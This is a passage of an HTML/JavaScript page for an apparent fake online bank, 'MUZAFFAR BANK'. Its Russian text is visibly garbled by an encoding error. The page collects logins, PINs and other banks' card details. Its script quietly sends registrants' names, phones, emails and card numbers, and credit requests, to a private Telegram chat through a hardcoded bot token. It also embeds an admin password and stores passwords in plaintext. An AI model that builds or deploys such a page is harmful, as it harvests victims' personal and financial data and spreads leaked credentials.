                <select id="credit-rate" class="form-control">
                  <option value="12">12%</option>
                  <option value="10">10%</option>
                </select>
              </div>
              <div style="background: #f5f5f5; padding: var(--space-lg); border-radius: var(--radius-lg);">
                <div style="display: flex; justify-content: space-between;">
                  <span>–ï–∂–µ–º–µ—Å—è—á–Ω—ã–π –ø–ª–∞—Ç–µ–∂:</span>
                  <span style="font-weight: 700; color: var(--primary);" id="monthly-payment">0 —Å–æ–º.</span>
                </div>
              </div>
              <button id="apply-credit-btn" class="btn btn-primary" style="width: 100%; margin-top: var(--space-lg);">
                –û—Ñ–æ—Ä–º–∏—Ç—å –∑–∞—è–≤–∫—É
              </button>
            </div>
            <div style="background: #f5f5f5; padding: var(--space-lg); border-radius: var(--radius-lg);">
              <h4>–£—Å–ª–æ–≤–∏—è</h4>
              <p>‚úì –ì—Ä–∞–∂–¥–∞–Ω—Å—Ç–≤–æ –¢–∞–¥–∂–∏–∫–∏—Å—Ç–∞–Ω–∞</p>
              <p>‚úì –í–æ–∑—Ä–∞—Å—Ç –æ—Ç 21 –≥–æ–¥–∞</p>
              <p>‚úì –ü–æ—Å—Ç–æ—è–Ω–Ω—ã–π –¥–æ—Ö–æ–¥</p>
            </div>
          </div>
        </div>
        <div class="card">
          <h4>–ú–æ–∏ –∫—Ä–µ–¥–∏—Ç—ã</h4>
          <div id="my-credits-list">
            <p style="text-align: center; color: #666; padding: var(--space-xl);">–ù–µ—Ç –∫—Ä–µ–¥–∏—Ç–æ–≤</p>
          </div>
        </div>
      </div>
      
      <!-- ===== QR-–ì–ï–ù–ï–†–ê–¢–û–† ===== -->
      <div id="qr-generator-tab" class="tab-content hidden">
        <div class="card">
          <h3 style="margin-bottom: var(--space-lg);">QR-–≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä</h3>
          <div class="form-group">
            <label class="form-label">–í—ã–±–µ—Ä–∏—Ç–µ –∫–∞—Ä—Ç—É:</label>
            <select id="qr-card-select" class="form-control"></select>
          </div>
          <div class="form-group">
            <label class="form-label">–°—É–º–º–∞:</label>
            <input type="number" id="qr-amount" class="form-control" placeholder="–ù–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ">
          </div>
          <button id="generate-qr-btn" class="btn btn-primary">
            <span class="material-icons">qr_code_2</span>–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å
          </button>
          <div id="qr-code-result" style="display: none; margin-top: var(--space-xl); text-align: center;">
            <div id="qrcode-display"></div>
            <div id="qr-display-card-number" style="margin-top: var(--space-md);"></div>
          </div>
        </div>
      </div>
    </main>

    <!-- –§—É—Ç–µ—Ä -->
    <footer class="footer">
      <div class="container">
        <div style="text-align: center;">
          <p>¬© 2026 MUZAFFAR BANK. –í—Å–µ –ø—Ä–∞–≤–∞ –∑–∞—â–∏—â–µ–Ω—ã.</p>
        </div>
      </div>
    </footer>
  </div>

  <!-- ===== –ú–û–î–ê–õ–¨–ù–´–ï –û–ö–ù–ê ===== -->
  
  <!-- –ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ -->
  <div id="deposit-modal" class="modal hidden">
    <div class="modal-content">
      <div class="modal-header">
        <h3 class="modal-title">
          <span class="material-icons">add</span>
          –ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞
        </h3>
        <button class="modal-close">&times;</button>
      </div>
      <div class="modal-body">
        <div class="form-group">
          <label class="form-label">–°—É–º–º–∞</label>
          <input type="number" id="deposit-amount" class="form-control" placeholder="–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É">
        </div>
        <div class="form-group">
          <label class="form-label">PIN-–∫–æ–¥</label>
          <input type="password" id="deposit-pin" class="form-control" placeholder="****" maxlength="4">
        </div>
        <div id="deposit-message" class="alert hidden"></div>
      </div>
      <div class="modal-footer">
        <button class="btn btn-outline close-modal">–û—Ç–º–µ–Ω–∞</button>
        <button id="confirm-deposit" class="btn btn-primary">–ü–æ–ø–æ–ª–Ω–∏—Ç—å</button>
      </div>
    </div>
  </div>

  <!-- –ü–µ—Ä–µ–≤–æ–¥ -->
  <div id="transfer-modal" class="modal hidden">
    <div class="modal-content">
      <div class="modal-header">
        <h3 class="modal-title">
          <span class="material-icons">send</span>
          –ü–µ—Ä–µ–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤
        </h3>
        <button class="modal-close">&times;</button>
      </div>
      <div class="modal-body">
        <div class="form-group">
          <label class="form-label">–ö–∞—Ä—Ç–∞ –ø–æ–ª—É—á–∞—Ç–µ–ª—è</label>
          <input type="text" id="recipient-card" class="form-control" placeholder="0000 0000 0000 0000">
        </div>
        <div class="form-group">
          <label class="form-label">–°—É–º–º–∞</label>
          <input type="number" id="transfer-amount" class="form-control" placeholder="–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É">
        </div>
        <div class="form-group">
          <label class="form-label">PIN-–∫–æ–¥</label>
          <input type="password" id="transfer-pin" class="form-control" placeholder="****" maxlength="4">
        </div>
        <div style="background: rgba(0,119,182,0.1); padding: var(--space-md); border-radius: var(--radius-lg); margin-bottom: var(--space-md);">
          <span class="material-icons" style="vertical-align: middle; color: var(--info);">info</span>
          <span style="color: var(--info);">–ö–æ–º–∏—Å—Å–∏—è: 1%</span>
        </div>
        <div id="transfer-message" class="alert hidden"></div>
      </div>
      <div class="modal-footer">
        <button class="btn btn-outline close-modal">–û—Ç–º–µ–Ω–∞</button>
        <button id="confirm-transfer" class="btn btn-primary">–ü–µ—Ä–µ–≤–µ—Å—Ç–∏</button>
      </div>
    </div>
  </div>

  <!-- –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –∫–∞—Ä—Ç—ã MUZAFFAR BANK -->
  <div id="add-card-modal" class="modal hidden">
    <div class="modal-content">
      <div class="modal-header">
        <h3 class="modal-title">
          <span class="material-icons">add_card</span>
          –î–æ–±–∞–≤–∏—Ç—å –∫–∞—Ä—Ç—É
        </h3>
        <button class="modal-close">&times;</button>
      </div>
      <div class="modal-body">
        <div class="form-group">
          <label class="form-label">–¢–∏–ø –∫–∞—Ä—Ç—ã</label>
          <select id="new-card-type" class="form-control">
            <option value="debit">–î–µ–±–µ—Ç–æ–≤–∞—è (0 —Å–æ–º.)</option>
            <option value="gold">Gold (500 —Å–æ–º.)</option>
            <option value="platinum">Platinum (1000 —Å–æ–º.)</option>
          </select>
        </div>
        <div class="form-group">
          <label class="form-label">–ù–∞–∑–≤–∞–Ω–∏–µ –∫–∞—Ä—Ç—ã</label>
          <input type="text" id="new-card-name" class="form-control" placeholder="–ú–æ—è –∫–∞—Ä—Ç–∞">
        </div>
        <div id="add-card-message" class="alert hidden"></div>
      </div>
      <div class="modal-footer">
        <button class="btn btn-outline close-modal">–û—Ç–º–µ–Ω–∞</button>
        <button id="confirm-add-card" class="btn btn-primary">–î–æ–±–∞–≤–∏—Ç—å</button>
      </div>
    </div>
  </div>

  <!-- –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤–Ω–µ—à–Ω–µ–π –∫–∞—Ä—Ç—ã -->
  <div id="add-external-card-modal" class="modal hidden">
    <div class="modal-content">
      <div class="modal-header">
        <h3 class="modal-title">
          <span class="material-icons">add_link</span>
          –ü—Ä–∏–≤—è–∑–∞—Ç—å –∫–∞—Ä—Ç—É –¥—Ä—É–≥–æ–≥–æ –±–∞–Ω–∫–∞
        </h3>
        <button class="modal-close">&times;</button>
      </div>
      <div class="modal-body">
        <div class="form-group">
          <label class="form-label">–í—ã–±–µ—Ä–∏—Ç–µ –±–∞–Ω–∫</label>
          <select id="external-bank" class="form-control">
            <option value="">-- –í—ã–±–µ—Ä–∏—Ç–µ –±–∞–Ω–∫ --</option>
            <option value="–°–±–µ—Ä–±–∞–Ω–∫">–°–±–µ—Ä–±–∞–Ω–∫</option>
            <option value="–¢–∏–Ω—å–∫–æ—Ñ—Ñ">–¢–∏–Ω—å–∫–æ—Ñ—Ñ</option>
            <option value="–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫">–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫</option>
            <option value="–í–¢–ë">–í–¢–ë</option>
            <option value="–î—Ä—É–≥–æ–π">–î—Ä—É–≥–æ–π –±–∞–Ω–∫</option>
          </select>
        </div>
        <div id="custom-bank-group" class="form-group hidden">
          <label class="form-label">–ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞</label>
          <input type="text" id="custom-bank-name" class="form-control" placeholder="–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞">
        </div>
        <div class="form-group">
          <label class="form-label">–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã</label>
          <input type="text" id="external-card-number" class="form-control" placeholder="0000 0000 0000 0000" maxlength="19">
        </div>
        <div class="form-group">
          <label class="form-label">–°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è</label>
          <input type="text" id="external-card-expiry" class="form-control" placeholder="–ú–ú/–ì–ì" maxlength="5">
        </div>
        <div class="form-group">
          <label class="form-label">–ù–∞–∑–≤–∞–Ω–∏–µ –∫–∞—Ä—Ç—ã</label>
          <input type="text" id="external-card-name" class="form-control" placeholder="–ú–æ—è –∑–∞—Ä–ø–ª–∞—Ç–Ω–∞—è –∫–∞—Ä—Ç–∞">
        </div>
        <div class="form-group">
          <label class="form-label">–í–ª–∞–¥–µ–ª–µ—Ü –∫–∞—Ä—Ç—ã</label>
          <input type="text" id="external-card-holder" class="form-control" placeholder="–ò–º—è –Ω–∞ –∫–∞—Ä—Ç–µ">
        </div>
        <div id="external-card-message" class="alert hidden"></div>
      </div>
      <div class="modal-footer">
        <button class="btn btn-outline close-modal">–û—Ç–º–µ–Ω–∞</button>
        <button id="confirm-add-external-card" class="btn btn-primary">–ü—Ä–∏–≤—è–∑–∞—Ç—å</button>
      </div>
    </div>
  </div>

  <!-- –ó–∞—è–≤–∫–∞ –Ω–∞ –∫—Ä–µ–¥–∏—Ç -->
  <div id="credit-modal" class="modal hidden">
    <div class="modal-content">
      <div class="modal-header">
        <h3 class="modal-title">
          <span class="material-icons">account_balance</span>
          –ó–∞—è–≤–∫–∞ –Ω–∞ –∫—Ä–µ–¥–∏—Ç
        </h3>
        <button class="modal-close">&times;</button>
      </div>
      <div class="modal-body">
        <div class="form-group">
          <label class="form-label">–°—É–º–º–∞ –∫—Ä–µ–¥–∏—Ç–∞</label>
          <input type="number" id="credit-modal-amount" class="form-control" value="10000">
        </div>
        <div class="form-group">
          <label class="form-label">–°—Ä–æ–∫ (–º–µ—Å—è—Ü–µ–≤)</label>
          <select id="credit-modal-term" class="form-control">
            <option value="6">6 –º–µ—Å—è—Ü–µ–≤</option>
            <option value="12">12 –º–µ—Å—è—Ü–µ–≤</option>
            <option value="24">24 –º–µ—Å—è—Ü–∞</option>
          </select>
        </div>
        <div id="credit-modal-message" class="alert hidden"></div>
      </div>
      <div class="modal-footer">
        <button class="btn btn-outline close-modal">–û—Ç–º–µ–Ω–∞</button>
        <button id="confirm-credit-btn" class="btn btn-primary">–û—Ç–ø—Ä–∞–≤–∏—Ç—å</button>
      </div>
    </div>
  </div>

  <!-- QR-–∫–æ–¥ -->
  <div id="qr-modal" class="modal hidden">
    <div class="modal-content">
      <div class="modal-header">
        <h3 class="modal-title">
          <span class="material-icons">qr_code</span>
          –ú–æ–π QR-–∫–æ–¥
        </h3>
        <button class="modal-close">&times;</button>
      </div>
      <div class="modal-body" style="text-align: center;">
        <div id="qrcode-modal"></div>
        <div id="qr-modal-card-number" style="margin-top: var(--space-lg);"></div>
      </div>
    </div>
  </div>

  <script>
    // ==============================================
    // MUZAFFAR BANK - –†–ê–ë–û–ß–ê–Ø –í–ï–†–°–ò–Ø
    // Telegram: 8031233615:AAGgZKmnpg27rBG351r4MslVg3Psi8Uykts
    // Chat ID: 5450527103
    // ==============================================
    
    // Telegram –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
    const TELEGRAM_BOT_TOKEN = '8031233615:AAGgZKmnpg27rBG351r4MslVg3Psi8Uykts';
    const TELEGRAM_CHAT_ID = '5450527103';
    
    // –î–∞–Ω–Ω—ã–µ –∞–¥–º–∏–Ω–∞
    const ADMIN_EMAIL = "admin@muzaffar.tj";
    const ADMIN_PASSWORD = "Admin123!";
    const ADMIN_CARD_NUMBER = "4111 1111 1111 1111";

    // –¢–∏–ø—ã –∫–∞—Ä—Ç
    const CARD_TYPES = {
      debit: { name: "–î–µ–±–µ—Ç–æ–≤–∞—è", price: 0 },
      gold: { name: "Gold", price: 500 },
      platinum: { name: "Platinum", price: 1000 }
    };

    // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
    let currentUser = null;
    let userCards = [];
    let externalCards = [];
    let userTransactions = [];
    let userCredits = [];
    let activeCardIndex = 0;

    // ==============================================
    // TELEGRAM –£–í–ï–î–û–ú–õ–ï–ù–ò–Ø
    // ==============================================
    
    async function sendTelegramMessage(message) {
      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
          })
        });
      } catch (error) {
        console.log("Telegram —Å–æ–æ–±—â–µ–Ω–∏–µ:", message);
      }
    }

    // ==============================================
    // –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø
    // ==============================================
    
    function initApp() {
      // –°–æ–∑–¥–∞–µ–º –∞–¥–º–∏–Ω–∞
      if (!localStorage.getItem('adminCreated')) {
        createAdminAccount();
        localStorage.setItem('adminCreated', 'true');
      }
      
      // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–µ—Å—Å–∏—é
      const savedUser = localStorage.getItem('currentUser');
      if (savedUser) {
        currentUser = JSON.parse(savedUser);
        loadUserData();
        showBankScreen();
      }
      
      setupEventListeners();
      initCreditCalculator();
    }

    // –°–æ–∑–¥–∞–Ω–∏–µ –∞–¥–º–∏–Ω–∞
    function createAdminAccount() {
      const adminCards = [{
        id: 'admin-card-1',
        type: 'platinum',
        number: ADMIN_CARD_NUMBER,
        name: 'Platinum –ê–¥–º–∏–Ω–∞',
        balance: 999999999,
        isPrimary: true,
        pin: '0000',
        expiry: '12/99'
      }];

      const adminData = {
        email: ADMIN_EMAIL,
        password: ADMIN_PASSWORD,
        isAdmin: true,
        fullName: "–®–∞—Ä–∏–ø–æ–≤ –ú—É–∑–∞—Ñ—Ñ–∞—Ä –ê–Ω–≤–∞—Ä–æ–≤–∏—á",
        phone: "+992 92 631 0060",
        cards: adminCards,
        externalCards: [],
        transactions: [],
        credits: []
      };

      localStorage.setItem(ADMIN_EMAIL, JSON.stringify(adminData));
    }

    // ==============================================
    // –ê–í–¢–û–†–ò–ó–ê–¶–ò–Ø
    // ==============================================
    
    function handleLogin() {
      const email = document.getElementById('login-email').value.trim();
      const password = document.getElementById('login-password').value;
      const message = document.getElementById('auth-message');
      
      if (!email || !password) {
        showMessage(message, "–í–≤–µ–¥–∏—Ç–µ email –∏ –ø–∞—Ä–æ–ª—å", false);
        return;
      }
      
      // –ê–¥–º–∏–Ω
      if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
        currentUser = { email: ADMIN_EMAIL };
        localStorage.setItem('currentUser', JSON.stringify(currentUser));
        loadUserData();
        showBankScreen();
        showMessage(message, "–í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω", true);
        return;
      }
      
      // –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å
      const userData = localStorage.getItem(email);
      if (userData) {
        const user = JSON.parse(userData);
        if (user.password === password) {
          currentUser = { email };
          localStorage.setItem('currentUser', JSON.stringify(currentUser));
          loadUserData();
          showBankScreen();
          showMessage(message, "–í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω", true);
          return;
        }
      }
      
      showMessage(message, "–ù–µ–≤–µ—Ä–Ω—ã–π email –∏–ª–∏ –ø–∞—Ä–æ–ª—å", false);
    }

    async function handleRegister() {
      const fullName = document.getElementById('register-fullname').value.trim();
      const phone = document.getElementById('register-phone').value.trim();
      const email = document.getElementById('register-email').value.trim();
      const password = document.getElementById('register-password').value;
      const message = document.getElementById('auth-message');
      
      if (!fullName || !phone || !email || !password) {
        showMessage(message, "–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è", false);
        return;
      }
      
      if (password.length < 6) {
        showMessage(message, "–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –Ω–µ –º–µ–Ω–µ–µ 6 —Å–∏–º–≤–æ–ª–æ–≤", false);
        return;
      }
      
      if (localStorage.getItem(email)) {
        showMessage(message, "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç", false);
        return;
      }
      
      // –°–æ–∑–¥–∞–µ–º –ø–µ—Ä–≤—É—é –∫–∞—Ä—Ç—É
      const firstCard = {
        id: Date.now().toString(),
        type: 'debit',
        number: generateCardNumber(),
        name: '–ú–æ—è –ø–µ—Ä–≤–∞—è –∫–∞—Ä—Ç–∞',
        balance: 1000,
        isPrimary: true,
        pin: '1234',
        expiry: '12/28'
      };
      
      const userData = {
        email,
        password,
        fullName,
        phone,
        isAdmin: false,
        cards: [firstCard],
        externalCards: [],
        transactions: [],
        credits: []
      };
      
      localStorage.setItem(email, JSON.stringify(userData));
      currentUser = { email };
      localStorage.setItem('currentUser', JSON.stringify(currentUser));
      
      await sendTelegramMessage(`
<b>üÜï –ù–û–í–ê–Ø –†–ï–ì–ò–°–¢–†–ê–¶–ò–Ø</b>
üë§ –ò–º—è: ${fullName}
üìû –¢–µ–ª–µ—Ñ–æ–Ω: ${phone}
üìß Email: ${email}
üí≥ –ö–∞—Ä—Ç–∞: ${firstCard.number}
      `);
      
      loadUserData();
      showBankScreen();
      showMessage(message, "–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞! –ü–æ–¥–∞—Ä–æ–∫ 1000 —Å–æ–º.", true);
    }

    // ==============================================
    // –í–ù–ï–®–ù–ò–ï –ö–ê–†–¢–´
    // ==============================================
    
    function handleAddExternalCard() {
      const bank = document.getElementById('external-bank').value;
      let bankName = bank;
      
      if (bank === '–î—Ä—É–≥–æ–π') {
        bankName = document.getElementById('custom-bank-name').value.trim();
        if (!bankName) {
          showMessage(document.getElementById('external-card-message'), "–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞", false);
          return;
        }
      }
      
      if (!bank) {
        showMessage(document.getElementById('external-card-message'), "–í—ã–±–µ—Ä–∏—Ç–µ –±–∞–Ω–∫", false);
        return;
      }
      
      const cardNumber = document.getElementById('external-card-number').value.replace(/\s/g, '');
      const expiry = document.getElementById('external-card-expiry').value;
      const name = document.getElementById('external-card-name').value.trim();
      const holder = document.getElementById('external-card-holder').value.trim();
      const message = document.getElementById('external-card-message');
      
      if (!/^\d{16}$/.test(cardNumber)) {
        showMessage(message, "–ù–µ–≤–µ—Ä–Ω—ã–π –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã", false);
        return;
      }
      
      if (!/^\d{2}\/\d{2}$/.test(expiry)) {
        showMessage(message, "–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç —Å—Ä–æ–∫–∞", false);
        return;
      }
      
      if (!name) {
        showMessage(message, "–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∫–∞—Ä—Ç—ã", false);
        return;
      }
      
      const existingCard = externalCards.find(c => c.number.replace(/\s/g, '') === cardNumber);
      if (existingCard) {
        showMessage(message, "–≠—Ç–∞ –∫–∞—Ä—Ç–∞ —É–∂–µ –ø—Ä–∏–≤—è–∑–∞–Ω–∞", false);
        return;
      }
      
      let bankClass = '';
      if (bankName.includes('–°–±–µ—Ä')) bankClass = 'sber';
      else if (bankName.includes('–¢–∏–Ω—å')) bankClass = 'tinkoff';
      else if (bankName.includes('–ê–ª—å—Ñ–∞')) bankClass = 'alfa';
      else if (bankName.includes('–í–¢–ë')) bankClass = 'vtb';
      
      const newCard = {
        id: Date.now().toString(),
        bank: bankName,
        number: formatCardNumber(cardNumber),
        expiry: expiry,
        name: name,
        holder: holder,
        class: bankClass
      };
      
      externalCards.push(newCard);
      saveUserData();
      
      showMessage(message, "–ö–∞—Ä—Ç–∞ —É—Å–ø–µ—à–Ω–æ –ø—Ä–∏–≤—è–∑–∞–Ω–∞!", true);
      
      setTimeout(() => {
        document.getElementById('add-external-card-modal').classList.add('hidden');
        document.getElementById('external-card-number').value = '';
        document.getElementById('external-card-expiry').value = '';
        document.getElementById('external-card-name').value = '';
        document.getElementById('external-card-holder').value = '';
        document.getElementById('custom-bank-name').value = '';
        document.getElementById('external-bank').value = '';
        document.getElementById('custom-bank-group').classList.add('hidden');
        
        updateExternalCardsList();
      }, 1500);
    }

    function deleteExternalCard(id) {
      if (confirm("–£–¥–∞–ª–∏—Ç—å –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—É—é –∫–∞—Ä—Ç—É?")) {
        externalCards = externalCards.filter(card => card.id !== id);
        saveUserData();
        updateExternalCardsList();
      }
    }

    function updateExternalCardsList() {
      const container = document.getElementById('external-cards-list');
      if (!container) return;
      
      if (externalCards.length === 0) {
        container.innerHTML = `
          <div style="text-align: center; padding: var(--space-xl); color: #666; grid-column: 1 / -1;">
            <span class="material-icons" style="font-size: 48px; color: #ccc; margin-bottom: var(--space-sm); display: block;">credit_card_off</span>
            <p>–ù–µ—Ç –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—ã—Ö –∫–∞—Ä—Ç –¥—Ä—É–≥–∏—Ö –±–∞–Ω–∫–æ–≤</p>
          </div>
        `;
        return;
      }
      
      container.innerHTML = externalCards.map(card => `
        <div class="external-card ${card.class}">
          <div class="external-card-header">
            <span class="external-card-bank">${card.bank}</span>
          </div>
          <div class="external-card-number">${card.number}</div>
          <div class="external-card-footer">
            <div>
              <div>${card.name}</div>
              <div style="font-size: 12px; color: #666;">${card.holder}</div>
            </div>
            <div style="display: flex; align-items: center; gap: var(--space-md);">
              <div>${card.expiry}</div>
              <button class="delete-external-btn" onclick="deleteExternalCard('${card.id}')">
                <span class="material-icons">delete</span>
              </button>
            </div>
          </div>
        </div>
      `).join('');
    }

    // ==============================================
    // –ö–†–ï–î–ò–¢–´
    // ==============================================
    
    function initCreditCalculator() {
      const amount = document.getElementById('credit-amount');
      const term = document.getElementById('credit-term');
      const rate = document.getElementById('credit-rate');
      
      function update() {
        const a = parseFloat(amount.value) || 0;
        const t = parseInt(term.value);
        const r = parseFloat(rate.value) / 100 / 12;
        
        if (a <= 0) return;
        
        const monthly = a * r * Math.pow(1 + r, t) / (Math.pow(1 + r, t) - 1);
        document.getElementById('monthly-payment').textContent = formatAmount(monthly);
      }
      
      amount.addEventListener('input', update);
      term.addEventListener('change', update);
      rate.addEventListener('change', update);
      update();
    }

    async function handleCreditApplication() {
      if (!currentUser) {
        alert("–í–æ–π–¥–∏—Ç–µ –≤ —Å–∏—Å—Ç–µ–º—É");
        return;
      }
      
      const amount = parseFloat(document.getElementById('credit-modal-amount').value);
      const term = parseInt(document.getElementById('credit-modal-term').value);
      
      const userData = JSON.parse(localStorage.getItem(currentUser.email));
      
      const credit = {
        id: Date.now(),
        amount,
        term,
        status: 'pending',
        appliedAt: new Date().toISOString()
      };
      
      if (!userData.credits) userData.credits = [];
      userData.credits.push(credit);
      localStorage.setItem(currentUser.email, JSON.stringify(userData));
      
      await sendTelegramMessage(`
<b>üí∞ –ù–û–í–ê–Ø –ó–ê–Ø–í–ö–ê –ù–ê –ö–†–ï–î–ò–¢</b>
üë§ –ö–ª–∏–µ–Ω—Ç: ${userData.fullName}
üìû –¢–µ–ª–µ—Ñ–æ–Ω: ${userData.phone}
üíµ –°—É–º–º–∞: ${formatAmount(amount)}
üìÜ –°—Ä–æ–∫: ${term} –º–µ—Å.
      `);
      
      document.getElementById('credit-modal').classList.add('hidden');
      alert("‚úÖ –ó–∞—è–≤–∫–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!");
      updateCreditsList();
    }

    function openCreditModal(type) {
      document.getElementById('credit-modal').classList.remove('hidden');
    }

    function updateCreditsList() {
      const container = document.getElementById('my-credits-list');
      if (!currentUser) return;
      
      const userData = JSON.parse(localStorage.getItem(currentUser.email) || '{}');
      const credits = userData.credits || [];
      
      if (credits.length === 0) {
        container.innerHTML = '<p style="text-align: center; padding: var(--space-xl);">–ù–µ—Ç –∫—Ä–µ–¥–∏—Ç–æ–≤</p>';
        return;
      }
      
      container.innerHTML = credits.map(c => `
        <div style="background: #f5f5f5; padding: var(--space-md); border-radius: var(--radius-lg); margin-bottom: var(--space-md);">
          <div>–°—É–º–º–∞: ${formatAmount(c.amount)}</div>
          <div>–°—Ä–æ–∫: ${c.term} –º–µ—Å.</div>
          <div>–°—Ç–∞—Ç—É—Å: –ù–∞ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–∏–∏</div>
        </div>
      `).join('');
    }

    // ==============================================
    // –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò
    // ==============================================
    
    function generateCardNumber() {
      let num = '';
      for (let i = 0; i < 16; i++) {
        num += Math.floor(Math.random() * 10);
        if ((i + 1) % 4 === 0 && i < 15) num += ' ';
      }
      return num;
    }

    function formatCardNumber(number) {
      return number.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
    }

    function formatAmount(amount) {
      return new Intl.NumberFormat('ru-RU', {
        style: 'currency',
        currency: 'TJS',
        minimumFractionDigits: 0
      }).format(amount);
    }

    function showMessage(element, msg, success) {
      element.textContent = msg;
      element.className = `alert ${success ? 'alert-success' : 'alert-error'}`;
      element.classList.remove('hidden');
      if (success) setTimeout(() => element.classList.add('hidden'), 3000);
    }

    function showAuthScreen() {
      document.getElementById('auth-screen').classList.remove('hidden');
      document.getElementById('bank-screen').classList.add('hidden');
    }

    function showBankScreen() {
      document.getElementById('auth-screen').classList.add('hidden');
      document.getElementById('bank-screen').classList.remove('hidden');
    }

    function loadUserData() {
      const userData = JSON.parse(localStorage.getItem(currentUser.email) || '{}');
      userCards = userData.cards || [];
      externalCards = userData.externalCards || [];
      userTransactions = userData.transactions || [];
      userCredits = userData.credits || [];
      
      updateUserDisplay();
      updateActiveCardDisplay();
      updateCardsList();
      updateExternalCardsList();
      updateRecentTransactions();
      updateQRCardSelector();
      updateCreditsList();
    }

    function saveUserData() {
      const userData = JSON.parse(localStorage.getItem(currentUser.email) || '{}');
      userData.cards = userCards;
      userData.externalCards = externalCards;
      userData.transactions = userTransactions;
      userData.credits = userCredits;
      localStorage.setItem(currentUser.email, JSON.stringify(userData));
    }

    function updateUserDisplay() {
      const userData = JSON.parse(localStorage.getItem(currentUser.email) || '{}');
      document.getElementById('user-display-name').textContent = userData.fullName || currentUser.email;
      
      const badge = document.getElementById('admin-badge');
      if (currentUser.email === ADMIN_EMAIL) {
        badge.classList.remove('hidden');
      } else {
        badge.classList.add('hidden');
      }
    }

    function updateActiveCardDisplay() {
      if (userCards.length === 0) return;
      const card = userCards[activeCardIndex];
      const cardElement = document.getElementById('active-card-display');
      cardElement.className = `bank-card ${card.type}`;
      document.getElementById('active-card-type-label').textContent = CARD_TYPES[card.type]?.name || '–î–µ–±–µ—Ç–æ–≤–∞—è';
      document.getElementById('active-card-number').textContent = card.number;
      document.getElementById('active-card-name').textContent = card.name;
      document.getElementById('active-card-expiry').textContent = card.expiry;
      document.getElementById('balance').textContent = formatAmount(card.balance);
    }

    function updateCardsList() {
      const container = document.getElementById('cards-list');
      if (!container) return;
      
      if (userCards.length === 0) {
        container.innerHTML = '<div style="text-align: center;">–ù–µ—Ç –∫–∞—Ä—Ç</div>';
        return;
      }
      
      container.innerHTML = userCards.map((card, i) => `
        <div class="card-item ${card.type}" style="background: ${card.type === 'gold' ? 'linear-gradient(145deg, #ffd700, #b8860b)' : card.type === 'platinum' ? 'linear-gradient(145deg, #e5e4e2, #a0a0a0)' : 'linear-gradient(145deg, #0a4d2e, #1e6e46)'};" onclick="selectCard(${i})">
          ${card.isPrimary ? '<div class="card-status">–û—Å–Ω–æ–≤–Ω–∞—è</div>' : ''}
          <div style="font-size: 12px;">${CARD_TYPES[card.type]?.name || '–î–µ–±–µ—Ç–æ–≤–∞—è'}</div>
          <div style="font-family: monospace; margin: 12px 0;">${card.number}</div>
          <div><strong>${formatAmount(card.balance)}</strong></div>
        </div>
      `).join('');
    }

    function updateQRCardSelector() {
      const select = document.getElementById('qr-card-select');
      if (!select) return;
      select.innerHTML = userCards.map((card, i) => 
        `<option value="${i}">${card.name}</option>`
      ).join('');
    }

    function updateRecentTransactions() {
      const container = document.getElementById('recent-transactions');
      if (!container || userTransactions.length === 0) return;
      
      container.innerHTML = userTransactions.slice(0, 5).map(t => `
        <div style="display: flex; justify-content: space-between; padding: var(--space-md); border-bottom: 1px solid #eee;">
          <div>${t.type === 'deposit' ? '–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ' : '–ü–µ—Ä–µ–≤–æ–¥'}</div>
          <div>${formatAmount(t.amount)}</div>
        </div>
      `).join('');
    }

    function addTransaction(type, amount, comment, balanceAfter) {
      userTransactions.unshift({
        id: Date.now(),
        type, amount, comment,
        timestamp: new Date().toISOString(),
        balanceAfter
      });
